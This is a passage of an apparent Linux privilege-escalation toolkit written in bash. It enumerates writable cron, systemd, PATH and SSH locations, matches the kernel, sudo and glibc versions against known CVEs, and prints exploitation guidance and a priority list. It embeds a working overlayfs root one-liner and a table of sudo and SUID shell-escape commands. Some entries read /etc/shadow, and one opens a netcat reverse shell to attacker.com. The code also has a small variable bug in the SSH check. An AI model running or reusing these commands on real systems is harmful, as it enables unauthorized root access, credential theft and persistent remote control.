    echo "[*] World-writable directories (excluding common temp locations)..." >>"$output_file"
    find / -type d -perm -002 2>/dev/null | grep -v -E "^/(proc|sys|dev|run|tmp|var/tmp)" | head -50 >>"$output_file"
    echo "" >>"$output_file"

    # Check specific interesting locations (ENHANCED)
    echo "[*] Checking user-accessible configuration areas..." >>"$output_file"

    # Check home directory configurations
    if [ -w "$HOME" ]; then
        echo "[+] Home directory is writable: $HOME" >>"$output_file"
    fi

    # Check for writable files in common configuration directories (NEW)
    local config_dirs=("/etc" "/var/www" "/opt" "/usr/local" "/home")
    for dir in "${config_dirs[@]}"; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "[+] Writable configuration directory: $dir" >>"$output_file"
        fi
    done
    echo "" >>"$output_file"

    # Check for writable files in PATH (ENHANCED)
    echo "[*] Checking for writable files in PATH..." >>"$output_file"
    echo "$PATH" | tr ':' '\n' | while read -r path_dir; do
        if [ -d "$path_dir" ] && [ -w "$path_dir" ]; then
            echo "[+] Writable directory in PATH: $path_dir" >>"$output_file"
            # List writable files in this PATH directory (NEW)
            find "$path_dir" -maxdepth 1 -type f -writable 2>/dev/null | while read -r file; do
                echo "    Writable file: $file" >>"$output_file"
            done
        fi
    done
    echo "" >>"$output_file"

    # Check for writable configuration files (ENHANCED)
    echo "[*] Checking for writable configuration files..." >>"$output_file"
    config_files="/etc/passwd /etc/shadow /etc/sudoers /etc/hosts /etc/crontab"
    for config in $config_files; do
        if [ -f "$config" ] && [ -w "$config" ]; then
            echo "[+] CRITICAL: Writable system config file: $config" >>"$output_file"
        fi
    done
    echo "" >>"$output_file"

    # Check for writable cron files (NEW)
    echo "[*] Checking for writable cron files..." >>"$output_file"
    find /etc/cron* /var/spool/cron* -type f -writable 2>/dev/null | while read -r file; do
        echo "[+] Writable cron file: $file" >>"$output_file"
    done
    echo "" >>"$output_file"

    # Check for writable systemd service files (NEW)
    echo "[*] Checking for writable systemd service files..." >>"$output_file"
    find /etc/systemd/system /lib/systemd/system -type f -writable 2>/dev/null | while read -r file; do
        echo "[+] Writable service file: $file" >>"$output_file"
    done
    echo "" >>"$output_file"

    # Check for writable startup files (NEW)
    echo "[*] Checking for writable startup files..." >>"$output_file"
    startup_files="/etc/rc.local /etc/init.d/* /etc/profile /etc/bash.bashrc"
    for startup_file in $startup_files; do
        if [ -f "$startup_file" ] && [ -w "$startup_file" ]; then
            echo "[+] Writable startup file: $startup_file" >>"$output_file"
        fi
    done
    echo "" >>"$output_file"

    # Check for writable log files (NEW)
    echo "[*] Checking for writable log files..." >>"$output_file"
    find /var/log -type f -writable 2>/dev/null | head -20 | while read -r file; do
        echo "[+] Writable log file: $file" >>"$output_file"
    done
    echo "" >>"$output_file"

    # Check for writable web directories (NEW)
    echo "[*] Checking for writable web directories..." >>"$output_file"
    web_dirs="/var/www /srv/www /opt/lampp/htdocs /var/www/html"
    for web_dir in $web_dirs; do
        if [ -d "$web_dir" ] && [ -w "$web_dir" ]; then
            echo "[+] Writable web directory: $web_dir" >>"$output_file"
        fi
    done
    echo "" >>"$output_file"

    # Check for writable database files (NEW)
    echo "[*] Checking for writable database files..." >>"$output_file"
    find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | while read -r db_file; do
        if [ -w "$db_file" ]; then
            echo "[+] Writable database file: $db_file" >>"$output_file"
        fi
    done | head -20
    echo "" >>"$output_file"

    # Check for writable SSH files (NEW)
    echo "[*] Checking for writable SSH files..." >>"$output_file"
    ssh_dirs="/etc/ssh /home/*/.ssh /root/.ssh"
    for ssh_dir in $ssh_dirs; do
        if [ -d "$ssh_dir" ] && [ -w "$ssh_dir" ]; then
            echo "[+] Writable SSH directory: $ssh_dir" >>"$output_file"
            # Check for specific SSH files
            for ssh_file in "$ssh_dir/authorized_keys" "$ssh_file/id_rsa" "$ssh_dir/config"; do
                if [ -f "$ssh_file" ] && [ -w "$ssh_file" ]; then
                    echo "    Writable SSH file: $ssh_file" >>"$output_file"
                fi
            done
        fi
    done
    echo "" >>"$output_file"

    # Add summary section (NEW)
    echo "--- Recon Summary ---" >>"$output_file"
    total_writable_files=$(grep -c "Writable file:" "$output_file" || echo "0")
    total_writable_dirs=$(grep -c "Writable directory:" "$output_file" || echo "0")
    interesting_locations=$(grep -c "^\[+\]" "$output_file" || echo "0")

    echo "Total writable files found: $total_writable_files" >>"$output_file"
    echo "Total writable directories found: $total_writable_dirs" >>"$output_file"
    echo "Interesting writable locations: $interesting_locations" >>"$output_file"
    echo "" >>"$output_file"

    # Add exploitation guidance (NEW)
    if [ "$interesting_locations" -gt 0 ]; then
        echo "--- Exploitation Guidance ---" >>"$output_file"
        echo "Writable files can be exploited in several ways:" >>"$output_file"
        echo "1. Cron files: Modify to execute commands when cron runs" >>"$output_file"
        echo "2. Service files: Modify to execute commands when service starts/restarts" >>"$output_file"
        echo "3. Startup files: Modify to execute commands at system/user startup" >>"$output_file"
        echo "4. PATH directories: Place malicious binaries with common names" >>"$output_file"
        echo "5. Config files: Modify to change system behavior or gain access" >>"$output_file"
        echo "6. SSH files: Add keys for persistent access" >>"$output_file"
        echo "7. Web directories: Upload web shells or malicious content" >>"$output_file"
        echo "" >>"$output_file"
    fi

    log_message "INFOS" "Writable files check saved to $output_file"
    return 0
}

recon_kernel_exploits() {
    log_message "INFOS" "Checking for potential kernel exploits"

    mkdir -p "$OUTPUT_DIR/recon"
    local output_file="$OUTPUT_DIR/recon/kernel_exploits.txt"

    echo "--- Kernel Exploit Analysis ---" >"$output_file"
    echo "Generated on: $(date)" >>"$output_file"
    echo "Running as user: $(whoami)" >>"$output_file"
    echo "" >>"$output_file"

    # Get comprehensive kernel information
    kernel_version=$(uname -r)
    kernel_release=$(uname -v)
    architecture=$(uname -m)
    os_version=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d'"' -f2)

    echo "--- System Information ---" >>"$output_file"
    echo "Kernel Version: $kernel_version" >>"$output_file"
    echo "Kernel Release: $kernel_release" >>"$output_file"
    echo "Architecture: $architecture" >>"$output_file"
    echo "OS Version: $os_version" >>"$output_file"
    echo "" >>"$output_file"

    # Extract version numbers for comparison
    kernel_major=$(echo "$kernel_version" | cut -d. -f1)
    kernel_minor=$(echo "$kernel_version" | cut -d. -f2)
    kernel_patch=$(echo "$kernel_version" | cut -d. -f3 | cut -d- -f1)

    echo "--- Kernel Version Breakdown ---" >>"$output_file"
    echo "Major: $kernel_major" >>"$output_file"
    echo "Minor: $kernel_minor" >>"$output_file"
    echo "Patch: $kernel_patch" >>"$output_file"
    echo "" >>"$output_file"

    # Initialize vulnerability tracking arrays
    vuln_count=0
    declare -a found_vulns=()
    declare -a vuln_details=()

    # Function to compare kernel versions
    version_compare() {
        local current_major=$1
        local current_minor=$2
        local current_patch=$3
        local vuln_major=$4
        local vuln_minor=$5
        local vuln_patch=$6

        # Convert to comparable numbers
        local current_num=$((current_major * 10000 + current_minor * 100 + current_patch))
        local vuln_num=$((vuln_major * 10000 + vuln_minor * 100 + vuln_patch))

        if [ "$current_num" -le "$vuln_num" ]; then
            return 0 # Vulnerable
        else
            return 1 # Not vulnerable
        fi
    }

    # Function to add vulnerability to tracking arrays
    add_vulnerability() {
        local vuln_name="$1"
        local vuln_detail="$2"
        found_vulns+=("$vuln_name")
        vuln_details+=("$vuln_detail")
        vuln_count=$((vuln_count + 1))
    }

    echo "--- Known Kernel Vulnerabilities ---" >>"$output_file"

    # Dirty COW (CVE-2016-5195) - Expanded check
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 8 3; then
        if [[ "$kernel_version" =~ ^2\.6\. ]] || [[ "$kernel_version" =~ ^3\. ]] || ([[ "$kernel_version" =~ ^4\. ]] && [[ "${kernel_patch}" -lt "9" ]]); then
            echo "[+] CRITICAL: Potentially vulnerable to Dirty COW (CVE-2016-5195)" >>"$output_file"
            echo "    Affected: Linux kernel 2.6.22 - 4.8.3" >>"$output_file"
            echo "    Impact: Local privilege escalation via copy-on-write" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://dirtycow.ninja/" >>"$output_file"
            echo "    PoC: https://github.com/FireFart/dirtycow/blob/master/dirty.c" >>"$output_file"
            echo "    Test: echo 'this is not a test' > /tmp/foo && cp /etc/passwd /tmp/passwd.bak" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "Dirty COW (CVE-2016-5195)" "CRITICAL - Local privilege escalation via copy-on-write"
        fi
    fi

    # KASLR/SMEP Bypass (CVE-2017-5123) - waitid()
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 14 0; then
        echo "[+] HIGH: Potentially vulnerable to waitid() KASLR/SMEP bypass (CVE-2017-5123)" >>"$output_file"
        echo "    Affected: Linux kernel < 4.14" >>"$output_file"
        echo "    Impact: Local privilege escalation via waitid() system call" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/nongiach/CVE/tree/master/CVE-2017-5123" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "waitid() KASLR/SMEP bypass (CVE-2017-5123)" "HIGH - Local privilege escalation via waitid() system call"
    fi

    # Stack Clash (CVE-2017-1000364)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 11 9; then
        echo "[+] HIGH: Potentially vulnerable to Stack Clash (CVE-2017-1000364)" >>"$output_file"
        echo "    Affected: Linux kernel < 4.11.9" >>"$output_file"
        echo "    Impact: Local privilege escalation via stack exhaustion" >>"$output_file"
        echo "    CVSS Score: 7.4 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/local/stack_clash.rb" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "Stack Clash (CVE-2017-1000364)" "HIGH - Local privilege escalation via stack exhaustion"
    fi

    # DCCP Double-Free (CVE-2017-6074)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 4 9 11; then
        echo "[+] CRITICAL: Potentially vulnerable to DCCP Double-Free (CVE-2017-6074)" >>"$output_file"
        echo "    Affected: Linux kernel 2.6.18 - 4.9.11" >>"$output_file"
        echo "    Impact: Local privilege escalation via DCCP module" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074" >>"$output_file"
        echo "    Test: lsmod | grep dccp" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "DCCP Double-Free (CVE-2017-6074)" "CRITICAL - Local privilege escalation via DCCP module"
    fi

    # Netfilter Heap Overflow (CVE-2021-22555)
    if version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 12 0; then
        echo "[+] CRITICAL: Potentially vulnerable to Netfilter Heap Overflow (CVE-2021-22555)" >>"$output_file"
        echo "    Affected: Linux kernel 2.6.19 - 5.12.0" >>"$output_file"
        echo "    Impact: Local privilege escalation via netfilter" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "Netfilter Heap Overflow (CVE-2021-22555)" "CRITICAL - Local privilege escalation via netfilter"
    fi

    # eBPF Verifier (CVE-2021-3490, CVE-2021-3489, CVE-2021-3491)
    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -le 12 ]]; then
        echo "[+] HIGH: Potentially vulnerable to eBPF Verifier vulnerabilities (CVE-2021-3490/3489/3491)" >>"$output_file"
        echo "    Affected: Linux kernel 5.7 - 5.12" >>"$output_file"
        echo "    Impact: Local privilege escalation via eBPF verifier" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490" >>"$output_file"
        echo "    Test: /proc/sys/kernel/unprivileged_bpf_disabled" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "eBPF Verifier (CVE-2021-3490/3489/3491)" "HIGH - Local privilege escalation via eBPF verifier"
    fi

    # PwnKit - Polkit pkexec (CVE-2021-4034)
    echo "--- Checking for PwnKit (CVE-2021-4034) ---" >>"$output_file"
    if [ -f "/usr/bin/pkexec" ]; then
        if [ -u "/usr/bin/pkexec" ]; then
            echo "[+] CRITICAL: pkexec binary found with SUID bit - PwnKit vulnerable!" >>"$output_file"
            echo "    Binary: /usr/bin/pkexec" >>"$output_file"
            echo "    Impact: Local privilege escalation to root" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://github.com/berdav/CVE-2021-4034" >>"$output_file"
            echo "    Quick Test: ls -la /usr/bin/pkexec" >>"$output_file"
            ls -la /usr/bin/pkexec >>"$output_file" 2>/dev/null
            echo "" >>"$output_file"
            add_vulnerability "PwnKit (CVE-2021-4034)" "CRITICAL - Local privilege escalation to root via pkexec"
        else
            echo "[-] pkexec found but no SUID bit set" >>"$output_file"
        fi
    else
        echo "[-] pkexec not found on system" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Sudo Baron Samedit (CVE-2021-3156)
    echo "--- Checking for Sudo Baron Samedit (CVE-2021-3156) ---" >>"$output_file"
    if command -v sudo >/dev/null 2>&1; then
        sudo_version=$(sudo -V 2>/dev/null | head -n 1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
        echo "Sudo Version: $sudo_version" >>"$output_file"

        if echo "$sudo_version" | grep -E "^1\.(8\.[0-9]|9\.[0-5])" >/dev/null; then
            echo "[+] CRITICAL: Potentially vulnerable to Sudo Baron Samedit (CVE-2021-3156)" >>"$output_file"
            echo "    Affected: sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1" >>"$output_file"
            echo "    Impact: Local privilege escalation via sudo heap overflow" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: https://github.com/blasty/CVE-2021-3156" >>"$output_file"
            echo "    Test: sudoedit -s /nonexistent" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "Sudo Baron Samedit (CVE-2021-3156)" "CRITICAL - Local privilege escalation via sudo heap overflow"
        else
            echo "[-] Sudo version appears to be patched" >>"$output_file"
        fi
    else
        echo "[-] sudo not found on system" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # DirtyPipe (CVE-2022-0847)
    if [[ "$kernel_major" -eq 5 ]] && [[ "$kernel_minor" -ge 8 ]] && version_compare "$kernel_major" "$kernel_minor" "$kernel_patch" 5 16 11; then
        echo "[+] CRITICAL: Potentially vulnerable to DirtyPipe (CVE-2022-0847)" >>"$output_file"
        echo "    Affected: Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102" >>"$output_file"
        echo "    Impact: Local privilege escalation via pipe vulnerability" >>"$output_file"
        echo "    CVSS Score: 7.8 (High)" >>"$output_file"
        echo "    Exploit: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits" >>"$output_file"
        echo "    Test: Check for pipe functionality" >>"$output_file"
        echo "" >>"$output_file"
        add_vulnerability "DirtyPipe (CVE-2022-0847)" "CRITICAL - Local privilege escalation via pipe vulnerability"
    fi

    # GameOver(lay) - CVE-2023-2640 & CVE-2023-32629
    echo "--- Checking for GameOver(lay) Ubuntu Privilege Escalation ---" >>"$output_file"
    if grep -qi ubuntu /etc/os-release 2>/dev/null; then
        ubuntu_version=$(grep VERSION_ID /etc/os-release 2>/dev/null | cut -d'"' -f2)
        echo "Ubuntu Version: $ubuntu_version" >>"$output_file"

        # Check if it's a vulnerable Ubuntu version
        if [[ "$ubuntu_version" =~ ^(20\.04|22\.04|23\.04) ]]; then
            echo "[+] HIGH: Potentially vulnerable to GameOver(lay) Ubuntu exploit" >>"$output_file"
            echo "    CVE: CVE-2023-2640 & CVE-2023-32629" >>"$output_file"
            echo "    Affected: Ubuntu 20.04, 22.04, 23.04" >>"$output_file"
            echo "    Impact: Local privilege escalation via overlayfs" >>"$output_file"
            echo "    CVSS Score: 7.8 (High)" >>"$output_file"
            echo "    Exploit: unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"id\\\")'\"" >>"$output_file"
            echo "    Reference: https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability" >>"$output_file"
            echo "" >>"$output_file"
            add_vulnerability "GameOver(lay) (CVE-2023-2640 & CVE-2023-32629)" "HIGH - Local privilege escalation via overlayfs on Ubuntu"
        fi
    else
        echo "[-] Not running Ubuntu" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Looney Tunables (CVE-2023-4911)
    echo "--- Checking for Looney Tunables (CVE-2023-4911) ---" >>"$output_file"
    if [ -f "/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2" ] || [ -f "/lib64/ld-linux-x86-64.so.2" ]; then
        # Check glibc version
        glibc_version=$(ldd --version 2>/dev/null | head -n1 | grep -oE '[0-9]+\.[0-9]+')
        echo "GLIBC Version: $glibc_version" >>"$output_file"

        if [[ -n "$glibc_version" ]]; then
            # Vulnerable versions: glibc 2.34 to 2.38
            if [[ "$glibc_version" =~ ^2\.(3[4-8]) ]]; then
                echo "[+] CRITICAL: Potentially vulnerable to Looney Tunables (CVE-2023-4911)" >>"$output_file"
                echo "    Affected: glibc 2.34 - 2.38" >>"$output_file"
                echo "    Impact: Local privilege escalation via GLIBC_TUNABLES" >>"$output_file"
                echo "    CVSS Score: 7.8 (High)" >>"$output_file"
                echo "    Exploit: https://github.com/leesh3288/CVE-2023-4911" >>"$output_file"
                echo "    Test: env GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A /bin/true" >>"$output_file"
                echo "" >>"$output_file"
                add_vulnerability "Looney Tunables (CVE-2023-4911)" "CRITICAL - Local privilege escalation via GLIBC_TUNABLES"
            fi
        fi
    else
        echo "[-] Could not determine GLIBC version" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Additional checks for kernel configuration
    echo "--- Kernel Security Features Check ---" >>"$output_file"

    # Check KASLR
    if [ -f "/proc/sys/kernel/randomize_va_space" ]; then
        kaslr_status=$(cat /proc/sys/kernel/randomize_va_space)
        if [ "$kaslr_status" -eq 2 ]; then
            echo "[+] KASLR: Enabled (randomize_va_space = 2)" >>"$output_file"
        elif [ "$kaslr_status" -eq 1 ]; then
            echo "[!] KASLR: Partially enabled (randomize_va_space = 1)" >>"$output_file"
        else
            echo "[-] KASLR: Disabled (randomize_va_space = 0) - VULNERABLE" >>"$output_file"
            add_vulnerability "KASLR Disabled" "MEDIUM - Address space layout randomization disabled"
        fi
    fi

    # Check SMEP/SMAP
    if [ -f "/proc/cpuinfo" ]; then
        if grep -q smep /proc/cpuinfo; then
            echo "[+] SMEP: CPU supports SMEP" >>"$output_file"
        else
            echo "[-] SMEP: CPU does not support SMEP" >>"$output_file"
        fi

        if grep -q smap /proc/cpuinfo; then
            echo "[+] SMAP: CPU supports SMAP" >>"$output_file"
        else
            echo "[-] SMAP: CPU does not support SMAP" >>"$output_file"
        fi
    fi

    # Check NX bit
    if grep -q nx /proc/cpuinfo; then
        echo "[+] NX: CPU supports NX bit" >>"$output_file"
    else
        echo "[-] NX: CPU does not support NX bit" >>"$output_file"
    fi

    # Check for kptr_restrict
    if [ -f "/proc/sys/kernel/kptr_restrict" ]; then
        kptr_status=$(cat /proc/sys/kernel/kptr_restrict)
        if [ "$kptr_status" -eq 2 ]; then
            echo "[+] KPTR: Kernel pointers hidden from all users" >>"$output_file"
        elif [ "$kptr_status" -eq 1 ]; then
            echo "[!] KPTR: Kernel pointers hidden from non-root" >>"$output_file"
        else
            echo "[-] KPTR: Kernel pointers visible - potential info leak" >>"$output_file"
        fi
    fi

    # Check dmesg restrictions
    if [ -f "/proc/sys/kernel/dmesg_restrict" ]; then
        dmesg_status=$(cat /proc/sys/kernel/dmesg_restrict)
        if [ "$dmesg_status" -eq 1 ]; then
            echo "[+] DMESG: Restricted to privileged users" >>"$output_file"
        else
            echo "[-] DMESG: Accessible by unprivileged users" >>"$output_file"
        fi
    fi
    echo "" >>"$output_file"

    # Check for available exploit tools
    echo "--- Exploit Development Tools Check ---" >>"$output_file"
    exploit_tools=("gcc" "make" "python" "python3" "perl" "ruby" "nc" "ncat" "netcat")
    available_tools=""

    for tool in "${exploit_tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            available_tools="$available_tools $tool"
        fi
    done

    if [ -n "$available_tools" ]; then
        echo "[+] Available development tools:$available_tools" >>"$output_file"
        echo "    These tools can be used to compile and run exploits" >>"$output_file"
    else
        echo "[-] No development tools found" >>"$output_file"
        echo "    This may limit exploit capabilities" >>"$output_file"
    fi
    echo "" >>"$output_file"

    # Generate summary and recommendations
    echo "===========================================" >>"$output_file"
    echo "           VULNERABILITY SUMMARY" >>"$output_file"
    echo "===========================================" >>"$output_file"
    echo "Total vulnerabilities found: $vuln_count" >>"$output_file"
    echo "" >>"$output_file"

    if [ "$vuln_count" -gt 0 ]; then
        echo "IDENTIFIED VULNERABILITIES:" >>"$output_file"
        echo "----------------------------" >>"$output_file"
        for i in "${!found_vulns[@]}"; do
            echo "$((i + 1)). ${found_vulns[i]}" >>"$output_file"
            echo "   ${vuln_details[i]}" >>"$output_file"
            echo "" >>"$output_file"
        done

        echo "[!] SECURITY RECOMMENDATIONS:" >>"$output_file"
        echo "1. Update the kernel to the latest stable version" >>"$output_file"
        echo "2. Apply all available security patches" >>"$output_file"
        echo "3. Consider using a distribution with regular security updates" >>"$output_file"
        echo "4. Enable additional kernel hardening features if available" >>"$output_file"
        echo "" >>"$output_file"

        echo "[!] EXPLOITATION PRIORITY:" >>"$output_file"
        echo "1. Check PwnKit (CVE-2021-4034) first - often most reliable" >>"$output_file"
        echo "2. Try Sudo Baron Samedit (CVE-2021-3156) if sudo is available" >>"$output_file"
        echo "3. Attempt DirtyPipe (CVE-2022-0847) for newer kernels" >>"$output_file"
        echo "4. Consider Dirty COW (CVE-2016-5195) for older systems" >>"$output_file"
        echo "5. GameOver(lay) for Ubuntu systems" >>"$output_file"
        echo "6. Looney Tunables (CVE-2023-4911) for systems with vulnerable glibc" >>"$output_file"
    else
        echo "[+] No obvious kernel vulnerabilities detected" >>"$output_file"
        echo "    The system appears to have updated kernel security patches" >>"$output_file"
        echo "    Consider other privilege escalation vectors (SUID, sudo, etc.)" >>"$output_file"
    fi
    echo "===========================================" >>"$output_file"

    log_message "INFOS" "Kernel exploit analysis saved to $output_file"
    log_message "INFOS" "Found $vuln_count potential vulnerabilities"

    return 0
}

# Initialize GTFOBins data (simplified version)
init_gtfobins() {
    log_message "INFOS" "Initializing GTFOBins data"

    # Create a temporary file with GTFOBins data
    mkdir -p "$(dirname "$GTFOBINS_DATA")"

    cat <<'EOF' >"$GTFOBINS_DATA"
# This is a simplified version of GTFOBins data
# Format: binary_name:type:exploit_command

# Sudo binaries
apt:sudo:sudo apt update -o APT::Update::Pre-Invoke=/bin/sh
apt-get:sudo:sudo apt-get update -o APT::Update::Pre-Invoke=/bin/sh
ash:sudo:sudo ash
awk:sudo:sudo awk 'BEGIN {system("/bin/sh")}'
bash:sudo:sudo bash
busybox:sudo:sudo busybox sh
cat:sudo:LFILE=/etc/shadow && sudo cat "$LFILE"
chmod:sudo:LFILE=/etc/shadow && sudo chmod 0777 $LFILE
chown:sudo:LFILE=/etc/shadow && sudo chown $(id -un):$(id -gn) $LFILE
cp:sudo:LFILE=/etc/shadow && TF=$(mktemp) && sudo cp $LFILE $TF && cat $TF
csh:sudo:sudo csh
curl:sudo:sudo curl file:///etc/shadow
dash:sudo:sudo dash
dd:sudo:LFILE=/etc/shadow && sudo dd if=$LFILE
env:sudo:sudo env /bin/sh
find:sudo:sudo find . -exec /bin/sh \; -quit
ftp:sudo:sudo ftp -c "!/bin/sh"
gdb:sudo:sudo gdb -nx -ex '!sh' -ex quit
git:sudo:sudo git -p help config
grep:sudo:LFILE=/etc/shadow && sudo grep . $LFILE
head:sudo:LFILE=/etc/shadow && sudo head -c1G $LFILE
less:sudo:sudo less /etc/profile && !/bin/sh
lua:sudo:sudo lua -e 'os.execute("/bin/sh")'
man:sudo:sudo man man && !/bin/sh
more:sudo:TERM= sudo more /etc/profile && !/bin/sh
mount:sudo:sudo mount -o bind /bin/sh /bin/mount && sudo mount
mv:sudo:LFILE=/etc/shadow && TF=$(mktemp) && sudo mv $LFILE $TF && cat $TF
nano:sudo:sudo nano && ^R^X && reset && ^X && echo "exec sh" > /tmp/nano.sh && chmod +x /tmp/nano.sh && sudo nano -s /tmp/nano.sh /etc/hosts
nc:sudo:RHOST=attacker.com && RPORT=12345 && sudo nc -e /bin/sh $RHOST $RPORT
nmap:sudo:TF=$(mktemp) && echo 'os.execute("/bin/sh")' > $TF && sudo nmap --script=$TF
perl:sudo:sudo perl -e 'exec "/bin/sh";'
php:sudo:sudo php -r "system('/bin/sh');"
python:sudo:sudo python -c 'import os; os.system("/bin/sh")'
python3:sudo:sudo python3 -c 'import os; os.system("/bin/sh")'
ruby:sudo:sudo ruby -e 'exec "/bin/sh"'
sed:sudo:sudo sed -n '1e exec sh 1>&0' /etc/hosts
sh:sudo:sudo sh
tar:sudo:sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
time:sudo:sudo time /bin/sh
vi:sudo:sudo vi -c ':!/bin/sh'
vim:sudo:sudo vim -c ':!/bin/sh'
zsh:sudo:sudo zsh

# SUID binaries
bash:suid:./bash -p
busybox:suid:./busybox sh
cp:suid:LFILE=/etc/shadow && TF=$(mktemp) && ./cp $LFILE $TF && cat $TF
curl:suid:./curl file:///etc/shadow
date:suid:LFILE=file_to_read && ./date -f $LFILE
env:suid:./env /bin/sh -p
find:suid:./find . -exec /bin/sh -p \; -quit
grep:suid:LFILE=/etc/shadow && ./grep '' $LFILE
less:suid:./less /etc/shadow
more:suid:./more /etc/shadow
nano:suid:./nano /etc/shadow
perl:suid:./perl -e 'exec "/bin/sh";'
php:suid:./php -r "pcntl_exec('/bin/sh', ['-p']);"
python:suid:./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3:suid:./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
ruby:suid:./ruby -e 'exec "/bin/sh -p"'
sh:suid:./sh -p
tar:suid:./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
vi:suid:./vi -c ':!/bin/sh -p'
vim:suid:./vim -c ':!/bin/sh -p'
zsh:suid:./zsh
EOF

    log_message "INFOS" "GTFOBins data initialized"
}

# Function to check if a binary is in GTFOBins
check_gtfobins() {
    local binary="$1"
    local type="$2"

    # Make sure GTFOBins data is initialized
    if [ ! -f "$GTFOBINS_DATA" ]; then
        init_gtfobins
    fi

    # Search for the binary and privilege type in GTFOBins data
    if grep -q "^$binary:$type:" "$GTFOBINS_DATA"; then
        echo -e "\n[+] $binary can be exploited via $type!"
        echo "    Exploit command:"
        grep "^$binary:$type:" "$GTFOBINS_DATA" | cut -d: -f3-
        echo "    Reference: https://gtfobins.github.io/gtfobins/$binary/"
        return 0
    else
        # Don't spam output with negative results
        return 1
    fi
}

# ----------------------------------------------------------------------
# Exploitation Module
# ----------------------------------------------------------------------

exploit_suggest() {
    log_message "INFOS" "Suggesting exploitation paths"

    mkdir -p "$OUTPUT_DIR/exploit"
    local output_file="$OUTPUT_DIR/exploit/suggestions.txt"
    local detailed_output="$OUTPUT_DIR/exploit/detailed_analysis.txt"

    echo "--- Exploitation Suggestions ---" >"$output_file"
    echo "--- Detailed Vulnerability Analysis ---" >"$detailed_output"
    echo "Generated: $(date)" >>"$output_file"
    echo "Generated: $(date)" >>"$detailed_output"
    echo "Target: $(hostname) ($(whoami))" >>"$output_file"
    echo "Target: $(hostname) ($(whoami))" >>"$detailed_output"
    echo "" >>"$output_file"
    echo "" >>"$detailed_output"

    # Check if recon has been run
    if [ ! -d "$OUTPUT_DIR/recon" ]; then
        echo "[-] Reconnaissance data not found. Run the recon module first." >>"$output_file"
        echo "[-] Reconnaissance data not found. Run the recon module first." >>"$detailed_output"
        log_message "WARN" "Reconnaissance data not found. Run the recon module first."
        return 1
    fi

    # Initialize counters and arrays for findings
    declare -a high_priority_vulns=()
    declare -a medium_priority_vulns=()
    declare -a low_priority_vulns=()
    total_vectors=0

    # 1. ENHANCED SUDO ANALYSIS
    echo "=== SUDO PRIVILEGE ANALYSIS ===" >>"$detailed_output"
    if [ -f "$OUTPUT_DIR/recon/sudo_privs.txt" ]; then
        echo "[*] Analyzing sudo privileges..." >>"$output_file"
        echo "[*] Analyzing sudo privileges..." >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Copy the raw sudo analysis to detailed output
        echo "Raw sudo privileges data:" >>"$detailed_output"
        echo "------------------------" >>"$detailed_output"
        cat "$OUTPUT_DIR/recon/sudo_privs.txt" >>"$detailed_output"
        echo "" >>"$detailed_output"

        # Check for immediate root access
        if grep -q "(ALL : ALL) ALL\|(ALL) ALL" "$OUTPUT_DIR/recon/sudo_privs.txt"; then
            echo "[!] CRITICAL: Full sudo access detected!" >>"$output_file"
            echo "[!] CRITICAL: Full sudo access detected!" >>"$detailed_output"
            echo "    Command: sudo su -" >>"$output_file"
            echo "    Command: sudo su -" >>"$detailed_output"
            echo "    Risk Level: CRITICAL - Immediate root access" >>"$output_file"
            echo "    Risk Level: CRITICAL - Immediate root access" >>"$detailed_output"
            echo "    Explanation: User has unrestricted sudo access to all commands" >>"$detailed_output"
